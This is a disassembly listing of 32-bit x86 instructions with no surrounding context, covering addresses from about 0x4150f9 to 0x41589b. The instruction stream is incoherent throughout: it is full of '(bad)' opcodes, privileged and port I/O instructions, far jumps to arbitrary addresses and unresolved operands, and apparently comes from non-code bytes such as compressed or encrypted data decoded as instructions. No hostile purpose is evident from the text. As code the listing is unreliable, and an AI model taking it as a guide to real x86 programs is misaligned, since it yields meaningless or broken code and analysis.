  4150f9:	pop    eax
  4150fa:	mov    bl,0x31
  4150fc:	jle    0x41511b
  4150fe:	pop    edi
  4150ff:	xor    eax,0x2dafe955
  415104:	inc    ebx
  415105:	xor    BYTE PTR [ecx+0x22bdd327],0x32
  41510c:	mov    dl,0x86
  41510e:	mov    al,ds:0xb3a59116
  415113:	adc    eax,0x2e11b283
  415118:	adc    ch,BYTE PTR [ebx]
  41511a:	fcmovu st,st(1)
  41511c:	mov    ds:0x7914bda3,eax
  415121:	sub    DWORD PTR [ecx+0x33],ebp
  415124:	icebp  
  415125:	push   ecx
  415126:	cmp    DWORD PTR [edx+0x5f],ecx
  415129:	jno    0x415154
  41512b:	fcmovne st,st(2)
  41512d:	stos   BYTE PTR es:[edi],al
  41512e:	mov    eax,ds:0xc8dbcd34
  415133:	lds    esi,FWORD PTR [ebp+0x0]
  415136:	mov    ebp,0xb0c6cd65
  41513b:	sbb    BYTE PTR ss:[eax],ah
  41513e:	xchg   ebp,eax
  41513f:	cmp    ebx,0x58
  415142:	jae    0x4151ba
  415144:	mov    al,0x50
  415146:	dec    eax
  415147:	lea    esi,[eax+edi*4-0x20]
  41514b:	jl     0x4151b8
  41514d:	mov    bh,0xcc
  41514f:	adc    eax,0xae93c534
  415154:	(bad)  
  415155:	retf   0xa032
  415158:	test   DWORD PTR [esi+0x27a54bbe],eax
  41515e:	scas   al,BYTE PTR es:[edi]
  41515f:	or     BYTE PTR [ebx],bl
  415161:	push   edx
  415162:	inc    edx
  415163:	xor    ecx,esi
  415165:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  415167:	dec    ebx
  415168:	cli    
  415169:	ins    DWORD PTR es:[edi],dx
  41516a:	int    0xee
  41516c:	xor    eax,0xf579ff73
  415171:	push   edi
  415173:	xchg   edx,eax
  415174:	ficom  DWORD PTR [edi+0x3946aeff]
  41517a:	out    0x6d,eax
  41517c:	(bad)  
  41517d:	sti    
  41517e:	or     eax,eax
  415180:	xchg   DWORD PTR [edx+0x3ee7f801],esp
  415186:	jle    0x415111
  415188:	scas   eax,DWORD PTR es:[edi]
  415189:	in     al,dx
  41518a:	ins    DWORD PTR es:[edi],dx
  41518b:	or     ecx,0x3b
  41518e:	add    al,0xad
  415190:	mov    bh,BYTE PTR [edx+ecx*8]
  415193:	mov    esp,?
  415195:	iret   
  415196:	gs jo  0x4151b0
  415199:	loop   0x415148
  41519b:	sbb    DWORD PTR [edx],esi
  41519d:	(bad)  
  41519e:	aad    0x87
  4151a0:	or     edx,eax
  4151a2:	(bad)  
  4151a3:	retf   0xb2ad
  4151a6:	adc    DWORD PTR [eax+ebx*8+0x16],ebp
  4151aa:	adc    eax,0x1e02cabd
  4151af:	mov    esp,0xd79e6a41
  4151b4:	ins    DWORD PTR es:[edi],dx
  4151b5:	jae    0x4151f2
  4151b7:	in     eax,0x1b
  4151b9:	nop
  4151ba:	lods   al,BYTE PTR ds:[esi]
  4151bb:	test   eax,0x6ca78ea5
  4151c0:	pushf  
  4151c1:	push   0xffffffc5
  4151c3:	xor    al,0x39
  4151c5:	xor    ebx,esp
  4151c7:	mov    ah,0x31
  4151c9:	inc    eax
  4151ca:	mov    esp,0xb84f5ebe
  4151cf:	call   0x7b38c7d2
  4151d4:	mov    BYTE PTR [ebp+0x68],bh
  4151d7:	mov    esi,0x4768a13d
  4151dc:	add    ch,ah
  4151de:	sbb    al,0x4b
  4151e0:	nop
  4151e1:	popf   
  4151e2:	fwait
  4151e3:	mov    eax,0xc1948c24
  4151e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151e9:	mov    eax,ds:0xbb113f03
  4151ee:	mov    eax,ds:0x35ee7219
  4151f3:	xchg   esi,eax
  4151f4:	sti    
  4151f5:	ss dec edi
  4151f7:	leave  
  4151f8:	and    BYTE PTR [ecx],dl
  4151fa:	pushf  
  4151fb:	jae    0x415192
  4151fd:	scas   eax,DWORD PTR es:[edi]
  4151fe:	aad    0x7
  415200:	leave  
  415201:	xchg   esi,eax
  415202:	addr16 mov bl,0xa
  415205:	imul   edi
  415207:	in     al,0x22
  415209:	js     0x41524c
  41520b:	ins    BYTE PTR es:[edi],dx
  41520c:	nop
  41520d:	jmp    0x502b349f
  415212:	and    al,0xb1
  415214:	(bad)  
  415215:	cli    
  415216:	push   edx
  415217:	mov    cl,0x6c
  415219:	dec    esp
  41521a:	cli    
  41521b:	mov    eax,0x74455f71
  415220:	clc    
  415221:	and    ebx,DWORD PTR [edi-0x5d04e38f]
  415227:	sub    ah,BYTE PTR ds:0x37a63925
  41522d:	cmp    eax,0x77aea18f
  415232:	dec    esp
  415233:	mov    ebx,0x4745bdf7
  415238:	int3   
  415239:	jmp    0xadc37f8b
  41523e:	std    
  41523f:	call   0xeb0d6fe4
  415244:	fucomip st,st(2)
  415246:	lods   al,BYTE PTR ds:[esi]
  415247:	pop    ebp
  415248:	in     al,0x2
  41524a:	in     al,0x11
  41524c:	inc    esp
  41524d:	mov    ds:0xcd3b667a,al
  415252:	lock es ret 
  415255:	clc    
  415256:	in     eax,dx
  415257:	(bad)  
  415258:	dec    eax
  415259:	cld    
  41525a:	push   es
  41525b:	xchg   DWORD PTR [ebx-0x63],eax
  41525e:	jle    0x4152c1
  415260:	cmc    
  415261:	aad    0xfc
  415263:	hlt    
  415264:	jnp    0x4151f3
  415266:	push   ds
  415267:	(bad)  
  415268:	mov    al,ds:0xef71fd17
  41526d:	dec    esi
  41526e:	inc    ebx
  41526f:	inc    edi
  415270:	jmp    0x41520a
  415272:	xchg   ebx,eax
  415273:	xor    eax,0x8a7bbec3
  415278:	pop    edx
  415279:	dec    edx
  41527a:	mov    ds:0x7d9d1477,eax
  41527f:	mov    bh,0x66
  415281:	sub    BYTE PTR ss:[esi-0x36],bl
  415285:	fstp   DWORD PTR [ecx+0x13b95368]
  41528b:	dec    eax
  41528c:	mov    eax,ds:0xf03463f8
  415291:	push   ebp
  415292:	mov    bl,0x37
  415294:	or     al,BYTE PTR ds:0x4a9a5891
  41529a:	mov    ds:0xef5c1adb,eax
  41529f:	cdq    
  4152a0:	es xchg edx,eax
  4152a2:	std    
  4152a3:	xchg   esi,eax
  4152a4:	inc    ebx
  4152a5:	out    0x35,al
  4152a7:	mov    edi,0x39908465
  4152ac:	jo     0x415308
  4152ae:	mov    dl,0xf1
  4152b0:	or     BYTE PTR [edx+0x6909682d],ah
  4152b6:	jne    0x4152f0
  4152b8:	push   ds
  4152b9:	inc    DWORD PTR [esi]
  4152bb:	push   esp
  4152bc:	mov    bl,dh
  4152be:	iret   
  4152bf:	add    DWORD PTR [ebx-0xa],0x34
  4152c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152c4:	jecxz  0x4152a3
  4152c6:	push   esi
  4152c7:	mov    ecx,0xdd5df49b
  4152cc:	xor    eax,0xa28c372e
  4152d1:	inc    esp
  4152d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152d3:	mov    cl,0xb1
  4152d5:	icebp  
  4152d6:	add    DWORD PTR [edi],edx
  4152d8:	mov    al,gs:0x2fff0cbc
  4152de:	mul    DWORD PTR [ebx]
  4152e0:	xchg   DWORD PTR [ecx-0x7b],edx
  4152e3:	adc    al,0x14
  4152e5:	cmc    
  4152e6:	outs   dx,DWORD PTR ds:[esi]
  4152e7:	jae    0x4152e0
  4152e9:	jl     0x415339
  4152eb:	sbb    al,0x8a
  4152ed:	dec    edx
  4152ee:	outs   dx,DWORD PTR ds:[esi]
  4152ef:	outs   dx,BYTE PTR ds:[esi]
  4152f0:	and    al,BYTE PTR [ebx]
  4152f2:	cmp    cl,dh
  4152f4:	mov    ch,0x49
  4152f6:	mov    esp,0x4ef7ab59
  4152fb:	(bad)
  4152fe:	jecxz  0x41528b
  415300:	jns    0x415381
  415302:	mov    dh,0x8c
  415304:	push   esp
  415305:	loope  0x415379
  415307:	out    dx,al
  415308:	mov    eax,0x6aea3f05
  41530d:	ret    
  41530e:	test   dl,bh
  415310:	mov    eax,0x7079ef92
  415315:	xor    al,0xa6
  415317:	adc    al,0x7c
  415319:	lock inc esp
  41531b:	rcl    DWORD PTR [eax+0x1d],cl
  41531e:	adc    al,0xac
  415320:	jne    0x41530b
  415322:	mov    edi,0x2c8d585e
  415327:	aas    
  415328:	pop    ebp
  415329:	fist   WORD PTR [edx]
  41532b:	pop    esi
  41532c:	or     eax,0xe7d49d7e
  415331:	mov    dl,0x81
  415333:	pusha  
  415334:	fsub   st,st(6)
  415336:	sub    al,0x2a
  415338:	sti    
  415339:	and    BYTE PTR [ebp-0x670712d6],bl
  41533f:	outs   dx,DWORD PTR ds:[esi]
  415340:	inc    esp
  415341:	jae    0x4153ba
  415343:	sbb    esp,DWORD PTR [eax-0xf]
  415346:	and    BYTE PTR [eax+eiz*4+0x2b38ff7],dh
  41534d:	mov    ds:0xe8d2c0b4,al
  415352:	fcomp  QWORD PTR [ecx]
  415354:	pop    es
  415355:	jecxz  0x4153ab
  415357:	into   
  415358:	fwait
  415359:	call   0x6e88c8e9
  41535e:	es stos DWORD PTR es:[edi],eax
  415360:	mov    bh,0x2c
  415362:	rcl    ch,cl
  415364:	xor    eax,0xeea29d80
  415369:	jnp    0x415347
  41536b:	mov    esi,0x87b7d6ee
  415370:	xor    esp,esp
  415372:	and    dl,BYTE PTR [edx]
  415374:	mov    ecx,0x28ec45d8
  415379:	imul   edx,DWORD PTR [edx],0xffffffc9
  41537c:	sti    
  41537d:	or     al,0xd
  41537f:	mov    al,ds:0xf1db6d3b
  415384:	loopne 0x4153ac
  415386:	sahf   
  415387:	cmp    BYTE PTR [ecx-0x75],dl
  41538a:	sbb    al,0xc
  41538c:	cld    
  41538d:	outs   dx,BYTE PTR ds:[esi]
  41538e:	inc    edi
  41538f:	xor    eax,0xe70b8891
  415394:	nop
  415395:	and    cl,BYTE PTR [ecx]
  415397:	cli    
  415398:	jns    0x415381
  41539a:	mov    ecx,0xc3ff8154
  41539f:	nop
  4153a0:	cdq    
  4153a1:	aam    0xa0
  4153a3:	gs pop es
  4153a5:	jns    0x4153cd
  4153a7:	fcmovbe st,st(3)
  4153a9:	sti    
  4153aa:	(bad)  
  4153ab:	mov    esp,0xdac4e5e2
  4153b0:	xchg   ebp,eax
  4153b1:	jle    0x415380
  4153b3:	or     BYTE PTR [ecx],bl
  4153b5:	push   esp
  4153b6:	ins    DWORD PTR es:[edi],dx
  4153b7:	push   cs
  4153b8:	fidiv  DWORD PTR [ecx]
  4153ba:	out    dx,eax
  4153bb:	and    cl,BYTE PTR [edi]
  4153bd:	push   ds
  4153be:	into   
  4153bf:	mov    DWORD PTR [edx-0x6f],edx
  4153c2:	pop    esp
  4153c3:	jge    0x4153e4
  4153c5:	imul   ebp,edi,0xb56d156c
  4153cb:	mov    gs,edi
  4153cd:	in     eax,dx
  4153ce:	ins    DWORD PTR es:[edi],dx
  4153cf:	push   0xa8d1ca46
  4153d4:	out    dx,al
  4153d5:	and    al,0x22
  4153d7:	scas   eax,DWORD PTR es:[edi]
  4153d8:	mov    bl,0x1b
  4153da:	adc    BYTE PTR [edi+edx*1-0x6ff0af65],0x71
  4153e2:	dec    eax
  4153e3:	ret    
  4153e4:	xor    BYTE PTR [edx-0x20],cl
  4153e7:	fdiv   DWORD PTR [eax]
  4153e9:	iret   
  4153ea:	lock dec edi
  4153ec:	xor    BYTE PTR [esi-0x4e],dl
  4153ef:	jns    0x41545c
  4153f1:	mov    bl,BYTE PTR [edi+0x60]
  4153f4:	push   cs
  4153f5:	data16 shr BYTE PTR [ecx+ebp*2],cl
  4153f9:	repnz sub DWORD PTR [eax+0x9],esi
  4153fd:	xor    edx,DWORD PTR [esi-0x40]
  415400:	loop   0x4153be
  415402:	push   es
  415403:	dec    edx
  415404:	les    edx,FWORD PTR [esi+0x768cb520]
  41540a:	mul    DWORD PTR [edx]
  41540c:	sbb    BYTE PTR [edx-0x2b],bl
  41540f:	lods   al,BYTE PTR ds:[esi]
  415410:	dec    eax
  415411:	jecxz  0x415407
  415413:	sub    edi,DWORD PTR [ebp-0x58]
  415416:	je     0x41542a
  415418:	pop    ds
  415419:	adc    al,ah
  41541b:	jb     0x4153db
  41541d:	mov    esp,0x11bfff46
  415422:	js     0x41540b
  415424:	dec    esp
  415425:	adc    bl,BYTE PTR [eax+esi*2]
  415428:	add    ebx,DWORD PTR [ecx]
  41542a:	jg     0x1314ddf3
  415430:	clc    
  415431:	mov    BYTE PTR [esi+0x5b4451a],al
  415437:	inc    ebx
  415438:	dec    esi
  415439:	jp     0x41545c
  41543b:	sub    al,al
  41543d:	hlt    
  41543e:	pop    ds
  41543f:	dec    ebx
  415440:	push   ebx
  415441:	dec    ebp
  415442:	mov    dl,0x4d
  415444:	mul    DWORD PTR [edx-0x2e]
  415447:	push   edi
  415448:	add    BYTE PTR [ebp+0x58],bl
  41544b:	adc    al,0x68
  41544d:	(bad)  
  41544e:	add    bl,BYTE PTR es:[edx]
  415451:	(bad)  
  415452:	pop    edx
  415453:	scas   eax,DWORD PTR es:[edi]
  415454:	bound  ebp,QWORD PTR [eax]
  415456:	mov    eax,0x128843fd
  41545b:	sub    DWORD PTR [edx+0x31],ecx
  41545e:	xchg   edx,eax
  41545f:	jns    0x415446
  415461:	in     al,0x69
  415463:	(bad)  
  415465:	stc    
  415466:	ss dec esi
  415468:	daa    
  415469:	or     eax,0xf02c1dca
  41546e:	cld    
  41546f:	int3   
  415470:	imul   ebx,ecx,0xaefbeb74
  415476:	in     eax,0x24
  415478:	cmp    BYTE PTR [ecx-0x38],ch
  41547b:	in     eax,dx
  41547c:	mov    ebx,0x71242265
  415481:	adc    cl,dh
  415483:	mov    ch,0xcf
  415485:	fnstenv [esi-0x38]
  415488:	or     ebx,DWORD PTR [edx+0x43]
  41548b:	mov    DWORD PTR [ecx],esp
  41548d:	in     eax,0x66
  41548f:	jns    0x4154dd
  415491:	in     eax,0x22
  415493:	jge    0x4154de
  415495:	jbe    0x41541c
  415497:	and    al,0xae
  415499:	into   
  41549a:	int    0x3b
  41549c:	or     BYTE PTR [ebx+0x73f98dfe],0x12
  4154a3:	in     al,0x48
  4154a5:	mov    dl,dl
  4154a7:	lahf   
  4154a8:	out    dx,al
  4154a9:	cli    
  4154aa:	pop    eax
  4154ab:	sub    DWORD PTR [edx+0x7e0e5474],ebp
  4154b1:	inc    ecx
  4154b2:	mov    al,dh
  4154b4:	jle    0x4154fe
  4154b6:	mov    dh,dh
  4154b8:	inc    ebp
  4154b9:	out    dx,eax
  4154ba:	iret   
  4154bb:	or     al,0x40
  4154bd:	test   al,0x13
  4154bf:	xchg   ebx,eax
  4154c0:	mov    bh,0x82
  4154c2:	outs   dx,DWORD PTR ds:[esi]
  4154c3:	fsub   QWORD PTR [edx]
  4154c5:	lods   eax,DWORD PTR ds:[esi]
  4154c6:	les    ebp,FWORD PTR [ecx+eax*4]
  4154c9:	push   ebx
  4154ca:	mov    esi,0x19ac3440
  4154cf:	sub    DWORD PTR [ecx-0x12],0x4aa610e7
  4154d6:	out    0xd6,al
  4154d8:	push   ebp
  4154d9:	add    eax,0xccf47a1c
  4154de:	outs   dx,BYTE PTR ds:[esi]
  4154df:	mov    eax,ds:0x7fe4056f
  4154e4:	mov    edi,0x6c41fca3
  4154e9:	inc    edi
  4154ea:	push   es
  4154eb:	jno    0x4154eb
  4154ed:	push   esp
  4154ee:	push   0xffffffbd
  4154f0:	push   ecx
  4154f1:	test   al,0x31
  4154f3:	pop    ss
  4154f4:	mov    ebx,0x3e4b33c3
  4154f9:	jg     0x41554d
  4154fb:	in     eax,dx
  4154fc:	(bad)  
  4154fd:	push   esp
  4154fe:	out    dx,eax
  4154ff:	pop    eax
  415500:	mov    al,dh
  415502:	mov    ah,0x16
  415504:	ret    
  415505:	or     al,0xe8
  415507:	mov    ebx,0x1ff9d5cb
  41550c:	or     edx,esi
  41550e:	jmp    0xb14d:0x5b86cd32
  415515:	shl    ecx,0x8
  415518:	mov    cl,0xd4
  41551a:	pop    ds
  41551b:	add    BYTE PTR [edi],0x17
  41551e:	mov    ch,0xf5
  415520:	dec    esi
  415521:	add    BYTE PTR [ebx+0x43],ch
  415524:	push   edx
  415525:	add    dh,BYTE PTR [eax+ecx*1+0x2f]
  415529:	dec    ebp
  41552a:	lods   eax,DWORD PTR ds:[esi]
  41552b:	adc    DWORD PTR [ebx-0x3bb9ea66],edx
  415531:	cld    
  415532:	pop    es
  415533:	xchg   edi,eax
  415534:	and    ah,cl
  415536:	call   0x2a3b:0xf0a9cf2f
  41553d:	push   ecx
  41553e:	inc    edi
  41553f:	das    
  415540:	xor    BYTE PTR [ebx],0x2a
  415543:	xchg   DWORD PTR [edx-0x28],eax
  415546:	js     0x415509
  415548:	pslld  mm0,mm4
  41554b:	in     al,dx
  41554c:	pushf  
  41554d:	cmp    BYTE PTR [ebx],al
  41554f:	fwait
  415550:	jecxz  0x415500
  415552:	pop    edi
  415553:	fnstenv [edi]
  415555:	cmp    bh,cl
  415557:	and    DWORD PTR [esp+ebx*4],0x1
  41555b:	clc    
  41555c:	int3   
  41555d:	fcom   QWORD PTR [edi+0x60]
  415560:	and    eax,0xfededf9d
  415565:	out    0xf5,al
  415567:	adc    al,0xb1
  415569:	or     BYTE PTR [edi-0x68541e12],ah
  41556f:	dec    eax
  415570:	ss pop esi
  415572:	test   BYTE PTR ds:0x51768b0e,bh
  415578:	lds    esp,FWORD PTR [ebx+0x12]
  41557b:	pop    eax
  41557c:	add    edi,DWORD PTR [edi+0x51]
  41557f:	sbb    cl,BYTE PTR [edx-0x2cfe070c]
  415585:	enter  0x182c,0x28
  415589:	es jl  0x4155e8
  41558c:	call   0x886d13fc
  415591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415592:	xchg   ebp,eax
  415593:	cdq    
  415594:	pop    es
  415595:	daa    
  415596:	pop    eax
  415597:	adc    eax,0x4d3203a7
  41559c:	int3   
  41559d:	cdq    
  41559e:	sub    BYTE PTR [eax],0x73
  4155a1:	or     eax,0x796621df
  4155a6:	fisub  DWORD PTR [ebp+0x24]
  4155a9:	push   0x5ff67a63
  4155ae:	pop    ebx
  4155af:	add    ebp,edi
  4155b1:	xlat   BYTE PTR ds:[ebx]
  4155b2:	mov    DWORD PTR [ebp+ebp*1-0x6c],esp
  4155b6:	and    BYTE PTR [ecx],dl
  4155b8:	push   esp
  4155b9:	mov    bl,0xa1
  4155bb:	test   eax,0x714c1309
  4155c0:	xchg   edi,eax
  4155c1:	xchg   esp,eax
  4155c2:	cwde   
  4155c3:	inc    edx
  4155c4:	call   edi
  4155c6:	scas   al,BYTE PTR es:[edi]
  4155c7:	hlt    
  4155c8:	call   0x8ece:0x410051a2
  4155cf:	div    dh
  4155d1:	xor    eax,0x8ab88faf
  4155d6:	leave  
  4155d7:	mov    ecx,0x2cfa7e3b
  4155dc:	xor    DWORD PTR [esi],edx
  4155de:	and    al,BYTE PTR [edi+0x6bb6cbc9]
  4155e4:	arpl   WORD PTR [esi+0x53],di
  4155e7:	jae    0x415657
  4155e9:	loopne 0x41565e
  4155eb:	jae    0x41562c
  4155ed:	pusha  
  4155ee:	mov    bh,0x25
  4155f0:	jl     0x41561c
  4155f2:	mov    ebx,0x59068f2d
  4155f7:	jae    0x415621
  4155f9:	(bad)  [ebx-0x50]
  4155fc:	jmp    0xe756fbc4
  415601:	push   cs
  415602:	xchg   ebp,eax
  415603:	jl     0x41565f
  415605:	neg    esp
  415607:	ds sub eax,0x34e05f57
  41560d:	xor    ch,al
  41560f:	xchg   ecx,eax
  415610:	adc    eax,0x96f6c67a
  415615:	mov    cl,0x27
  415617:	sbb    dh,BYTE PTR [esi+ecx*1]
  41561a:	addr16 mov al,0xec
  41561d:	push   edx
  41561e:	push   0x87506566
  415623:	lods   eax,DWORD PTR ds:[esi]
  415624:	fsub   QWORD PTR [ebp-0x2d7c2afe]
  41562a:	sbb    DWORD PTR [ebx],esp
  41562c:	scas   al,BYTE PTR es:[edi]
  41562d:	mov    esi,0x8a8fb0a9
  415632:	not    DWORD PTR [ebx]
  415634:	mov    ebp,0x40863b43
  415639:	test   BYTE PTR [edx+edx*4],cl
  41563c:	adc    bl,BYTE PTR [eax+esi*2+0x18]
  415640:	es jo  0x415610
  415643:	mov    es,WORD PTR [ebx+0x1e03fa6a]
  415649:	js     0x415663
  41564b:	fmul   QWORD PTR [edi]
  41564d:	push   esp
  41564e:	jno    0x4156c8
  415650:	popf   
  415651:	(bad)  
  415652:	out    0x19,al
  415654:	and    BYTE PTR [edx],dh
  415656:	sub    DWORD PTR [edi+0x1e],edi
  415659:	jae    0x415670
  41565b:	rcl    esp,0xbb
  41565e:	push   edx
  41565f:	scas   eax,DWORD PTR es:[edi]
  415660:	jl     0x41567a
  415662:	xlat   BYTE PTR ds:[ebx]
  415663:	inc    ecx
  415664:	xchg   edi,eax
  415665:	ret    0x19d3
  415668:	mov    eax,0xc41381c0
  41566d:	call   0x5d3069dc
  415672:	scas   eax,DWORD PTR es:[edi]
  415673:	dec    edx
  415674:	sbb    DWORD PTR [ebx+ecx*1-0x40e7c889],esi
  41567b:	inc    ecx
  41567c:	mov    ch,0x29
  41567e:	outs   dx,DWORD PTR fs:[esi]
  415680:	fwait
  415681:	lock lods eax,DWORD PTR ds:[esi]
  415683:	pop    edi
  415684:	test   BYTE PTR [esi+ecx*4+0x1431cd73],0x74
  41568c:	addr16 xor al,0x4
  41568f:	mov    WORD PTR [ebp+0x51e8b038],?
  415695:	add    DWORD PTR [esi],0xffffffe4
  415698:	xlat   BYTE PTR ds:[ebx]
  415699:	pop    eax
  41569a:	dec    ebp
  41569b:	dec    esi
  41569c:	pop    esi
  41569d:	inc    edx
  41569e:	and    DWORD PTR [eax],esp
  4156a0:	push   ds
  4156a1:	sub    cl,BYTE PTR [esp+ebx*1-0x18]
  4156a5:	in     al,0x76
  4156a7:	sub    dl,BYTE PTR [ebx-0x76]
  4156aa:	push   ecx
  4156ab:	outs   dx,DWORD PTR ds:[esi]
  4156ac:	enter  0xa1e3,0x7c
  4156b0:	mov    dh,0xa3
  4156b2:	cmp    al,0xdd
  4156b4:	jno    0x4156b0
  4156b6:	sub    eax,0x305a5e2a
  4156bb:	retf   
  4156bc:	sbb    eax,DWORD PTR [esi+0x22]
  4156bf:	addr16 dec ebp
  4156c1:	xor    al,0xf7
  4156c3:	mov    bh,0x25
  4156c5:	cdq    
  4156c6:	cmp    eax,0x3e2862de
  4156cb:	ret    0x7fd7
  4156ce:	mov    dl,0x38
  4156d0:	mov    ah,0x20
  4156d2:	sub    al,0x2c
  4156d4:	cmp    eax,0xf92c7c81
  4156d9:	lods   al,BYTE PTR ds:[esi]
  4156da:	push   ds
  4156db:	inc    ecx
  4156dc:	mov    bl,0x48
  4156de:	cmp    dh,dl
  4156e0:	outs   dx,DWORD PTR ds:[esi]
  4156e1:	stc    
  4156e2:	stos   DWORD PTR es:[edi],eax
  4156e3:	sub    al,BYTE PTR [esi-0x4675e431]
  4156e9:	fidiv  DWORD PTR [ebp+0x7e]
  4156ec:	and    al,0x3
  4156ee:	or     eax,0x4c166e33
  4156f3:	aas    
  4156f4:	push   ebx
  4156f5:	pop    edi
  4156f6:	ja     0x415744
  4156f8:	adc    bl,BYTE PTR [eax+0x20b6821e]
  4156fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156ff:	xor    ecx,DWORD PTR [esi-0x1d]
  415702:	inc    esp
  415703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415704:	retf   0x5bd
  415707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415708:	sub    al,0xc9
  41570a:	xor    DWORD PTR [ecx-0x84d4857],0x7e
  415711:	in     al,dx
  415712:	stos   DWORD PTR es:[edi],eax
  415713:	pop    ebp
  415714:	out    0x11,al
  415716:	jl     0x41571f
  415718:	mov    ds:0xe33580cd,al
  41571d:	mov    eax,DWORD PTR [ebx-0x7cf4f26d]
  415723:	xchg   ebx,eax
  415724:	jno    0x415782
  415726:	mov    WORD PTR [ebp-0x38],ss
  415729:	xor    al,0xc0
  41572b:	xchg   ebx,eax
  41572c:	lods   al,BYTE PTR ds:[esi]
  41572d:	add    eax,0x87e9aa39
  415732:	(bad)  
  415733:	jae    0xc47e3372
  415739:	test   BYTE PTR [eax],dh
  41573b:	mov    al,0xa0
  41573d:	push   edi
  41573e:	push   es
  41573f:	mov    eax,0xef77e832
  415744:	mov    ebx,0xd6f6dc69
  415749:	ss pop edx
  41574b:	lods   al,BYTE PTR ds:[esi]
  41574c:	iret   
  41574d:	push   esp
  41574e:	scas   eax,DWORD PTR es:[edi]
  41574f:	push   ebp
  415750:	in     eax,dx
  415751:	add    bl,BYTE PTR [eax+0x38]
  415754:	fisttp WORD PTR [edi]
  415756:	rol    BYTE PTR [edi-0x5b],cl
  415759:	aad    0x60
  41575b:	popa   
  41575c:	lods   eax,DWORD PTR ds:[esi]
  41575d:	mov    edx,0xf88294d5
  415762:	push   edx
  415763:	adc    DWORD PTR [ecx],eax
  415765:	outs   dx,DWORD PTR ds:[esi]
  415766:	enter  0xfd25,0x2
  41576a:	sub    eax,0xb4333fde
  41576f:	sti    
  415770:	mov    al,0xf5
  415772:	outs   dx,BYTE PTR ds:[esi]
  415773:	cmp    DWORD PTR [ebx],ecx
  415775:	sub    ch,al
  415777:	sysenter 
  415779:	(bad)  
  41577a:	fadd   QWORD PTR es:0x716074a7
  415781:	xchg   esp,eax
  415782:	pushf  
  415783:	pop    ebp
  415784:	popf   
  415785:	mov    WORD PTR [ebx+0x54],ss
  415788:	push   edx
  415789:	mov    al,ds:0xe6bae27
  41578e:	loopne 0x415789
  415790:	repz inc ebx
  415792:	cmp    DWORD PTR [ecx],0x61
  415795:	mov    eax,ds:0xea5f5575
  41579a:	add    ebx,ebx
  41579c:	inc    DWORD PTR [ecx]
  41579e:	jmp    0xd500:0xbbe9a814
  4157a5:	add    al,0x3a
  4157a7:	push   esp
  4157a8:	xchg   esi,eax
  4157a9:	bound  ecx,QWORD PTR [esi+0x6b657301]
  4157af:	xor    ecx,DWORD PTR [esi+0x3237ae3a]
  4157b5:	push   ebx
  4157b6:	(bad)  
  4157b7:	jno    0x4157d0
  4157b9:	mov    DWORD PTR [edi],ebx
  4157bb:	push   edx
  4157bc:	mov    bh,0xf4
  4157be:	sbb    BYTE PTR [ecx],bl
  4157c0:	in     al,0x84
  4157c2:	pop    ebx
  4157c3:	xor    eax,0x9a95f500
  4157c8:	ja     0x41578c
  4157ca:	xor    bh,BYTE PTR [ecx-0x7d]
  4157cd:	inc    eax
  4157ce:	sbb    al,0x2f
  4157d0:	leave  
  4157d1:	xor    DWORD PTR [esi-0x76719b16],ecx
  4157d7:	adc    ch,BYTE PTR [edx+0x24a4cfa1]
  4157dd:	fcomp  DWORD PTR ds:0x747e5eed
  4157e3:	xchg   ecx,eax
  4157e4:	aam    0xd3
  4157e6:	or     BYTE PTR [ecx-0x31a51368],bl
  4157ec:	add    BYTE PTR [edx-0x3b],ah
  4157ef:	adc    ah,ah
  4157f1:	adc    ebp,esi
  4157f3:	and    BYTE PTR ds:0xa81298bf,ch
  4157f9:	jl     0x4157cd
  4157fb:	into   
  4157fc:	push   cs
  4157fd:	mov    ecx,0xe3e4b443
  415802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415803:	fld    TBYTE PTR [esi+0x63]
  415806:	adc    ebx,DWORD PTR [ebx-0x38e50168]
  41580c:	fcmove st,st(5)
  41580e:	dec    ebp
  41580f:	ss pusha 
  415811:	into   
  415812:	stos   BYTE PTR es:[edi],al
  415813:	out    dx,al
  415814:	push   edx
  415815:	dec    eax
  415816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415817:	retf   0x3c48
  41581a:	aas    
  41581b:	outs   dx,DWORD PTR ds:[esi]
  41581c:	pop    ss
  41581d:	or     DWORD PTR [eax+0x1e57c1f1],esp
  415823:	ret    
  415824:	cmc    
  415825:	mov    ebx,0x9ecf3e61
  41582a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41582b:	xor    al,0xed
  41582d:	loope  0x4157b8
  41582f:	cmp    eax,0x650653a2
  415834:	sbb    bl,bl
  415836:	jnp    0x4157be
  415838:	fdivr  DWORD PTR [ecx-0x2adf5083]
  41583e:	pop    ss
  41583f:	js     0x415858
  415841:	push   ss
  415842:	out    0xe9,eax
  415844:	jae    0x415803
  415846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415847:	mov    ebx,0x6a9ffa98
  41584c:	enter  0x8276,0x6c
  415850:	rcr    DWORD PTR [edi-0x64],0xad
  415854:	or     ebp,DWORD PTR [esi+0xc]
  415857:	int3   
  415858:	sub    edi,DWORD PTR [eax+0xa]
  41585b:	lahf   
  41585c:	jns    0x41583c
  41585e:	jp     0x41581c
  415860:	js     0x415806
  415862:	pop    es
  415863:	dec    edi
  415864:	inc    ecx
  415865:	xor    eax,0x3d6cb508
  41586a:	jbe    0x4157fb
  41586c:	push   edx
  41586d:	cmp    DWORD PTR [esi-0x1],edx
  415870:	sbb    BYTE PTR [esp+edx*8],cl
  415873:	adc    eax,0x11892127
  415878:	xor    bh,bl
  41587a:	daa    
  41587b:	gs enter 0x30ee,0xc
  415880:	sbb    bh,BYTE PTR ss:[esi+0x42360eea]
  415887:	xchg   edi,eax
  415888:	xchg   edi,eax
  415889:	mov    ds:0xded4f530,al
  41588e:	jns    0x415897
  415890:	cmp    DWORD PTR [edx],esi
  415892:	mov    eax,DWORD PTR [ecx]
  415894:	icebp  
  415895:	jae    0x415888
  415897:	daa    
  415898:	(bad)  
  415899:	cmp    ah,al
  41589b:	or     dh,BYTE PTR [esi-0x377d2a18]
